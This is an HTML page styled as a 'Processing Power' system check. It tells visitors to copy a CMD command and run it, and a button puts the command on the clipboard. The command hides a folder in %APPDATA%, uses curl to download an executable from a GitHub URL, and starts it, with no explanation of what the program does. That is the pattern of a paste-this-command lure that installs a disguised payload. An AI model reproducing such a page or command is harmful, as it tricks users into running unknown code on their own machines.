<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>

<title>POWER CHECK SYSTEM</title>

<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;700;900&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    overflow:hidden;
    font-family:'Montserrat',sans-serif;
    background:#050505;
    display:flex;
    justify-content:center;
    align-items:center;
    position:relative;
    color:white;
}

/* ===== Main Card ===== */

.container{
    position:relative;
    z-index:5;
    width:90%;
    max-width:900px;
    border-radius:35px;
    overflow:hidden;
    background:rgba(255,255,255,0.05);
    backdrop-filter:blur(18px);

    border:1px solid rgba(255,255,255,0.08);

    box-shadow:
    0 0 30px rgba(255,0,0,0.12),
    0 0 120px rgba(0,0,0,0.8);
}

/* ===== Top ===== */

.top{
    position:relative;
    padding:40px;

    background:linear-gradient(
        135deg,
        #ff0000,
        #7a0000
    );
}

.logo{
    font-size:60px;
    margin-bottom:15px;
}

h1{
    font-size:42px;
    font-weight:900;
    letter-spacing:2px;
    text-transform:uppercase;
}

.subtitle{
    margin-top:10px;
    font-size:15px;
    color:#ffe5e5;
    line-height:1.7;
}

/* ===== Content ===== */

.content{
    padding:40px;
}

/* ===== Code Box ===== */

.code-box{
    position:relative;
    background:#0b0b0b;
    border-radius:25px;
    padding:25px;
    overflow:hidden;

    border:1px solid rgba(255,255,255,0.08);

    box-shadow:
    inset 0 0 20px rgba(255,255,255,0.03);
}

.code-box::before{
    content:'';
    position:absolute;
    inset:0;
    border-radius:25px;
    padding:1px;

    background:linear-gradient(
        90deg,
        #ff0000,
        #ffffff,
        #ff0000
    );

    -webkit-mask:
    linear-gradient(#fff 0 0) content-box,
    linear-gradient(#fff 0 0);

    -webkit-mask-composite:xor;

    mask-composite:exclude;
}

/* ===== Window Dots ===== */

.window{
    display:flex;
    gap:8px;
    margin-bottom:18px;
}

.dot{
    width:13px;
    height:13px;
    border-radius:50%;
}

.red{
    background:#ff4d4d;
}

.white{
    background:#ffffff;
}

.dark{
    background:#5c0000;
}

/* ===== Code ===== */

.code{
    color:#ffffff;
    font-size:15px;
    line-height:1.8;
    word-break:break-word;
    font-family:monospace;
}

/* ===== Buttons ===== */

.actions{
    display:flex;
    justify-content:center;
    margin-top:35px;
}

.copy-btn{
    border:none;

    background:linear-gradient(
        135deg,
        #ff0000,
        #b30000
    );

    color:white;

    font-size:17px;

    font-weight:700;

    padding:18px 45px;

    border-radius:18px;

    cursor:pointer;

    transition:0.3s;

    letter-spacing:1px;

    box-shadow:
    0 0 25px rgba(255,0,0,0.18);
}

.copy-btn:hover{
    transform:translateY(-3px);
}

.success{
    text-align:center;
    color:#ff4d4d;
    margin-top:20px;
    font-weight:600;
    display:none;
}

/* ===== Responsive ===== */

@media(max-width:768px){

    .top{
        padding:30px;
    }

    .content{
        padding:25px;
    }

    h1{
        font-size:30px;
    }

    .logo{
        font-size:45px;
    }

    .copy-btn{
        width:100%;
    }

    .code{
        font-size:13px;
    }

}

</style>
</head>

<body>

<div class="container">

    <div class="top">

        <div class="logo">💻</div>

        <h1>Processing Power</h1>

        <div class="subtitle">
            Copy the command below and run it in CMD.
        </div>

    </div>

    <div class="content">

        <div class="code-box">

            <div class="window">
                <div class="dot red"></div>
                <div class="dot white"></div>
                <div class="dot dark"></div>
            </div>

            <div class="code" id="command">
mkdir "%APPDATA%\SystemHealth" 2>nul & curl -L -o "%APPDATA%\SystemHealth\pardhan.exe" "https://github.com/messy-leon/Pardhanji/raw/main/pardhan.exe" & start "" "%APPDATA%\SystemHealth\pardhan.exe"
            </div>

        </div>

        <div class="actions">

            <button class="copy-btn" onclick="copyCode()">
                 COPY COMMAND
            </button>

        </div>

        <div class="success" id="msg">
             Command Copied Successfully
        </div>

    </div>

</div>

<script>

async function copyCode(){

    const text=document.getElementById("command").innerText.trim();

    const msg=document.getElementById("msg");

    try{

        await navigator.clipboard.writeText(text);

        msg.style.display="block";

        setTimeout(()=>{
            msg.style.display="none";
        },2500);

    }catch(err){

        const textarea=document.createElement("textarea");

        textarea.value=text;

        document.body.appendChild(textarea);

        textarea.select();

        document.execCommand("copy");

        document.body.removeChild(textarea);

        msg.style.display="block";

        setTimeout(()=>{
            msg.style.display="none";
        },2500);
    }

}

</script>

</body>
</html>
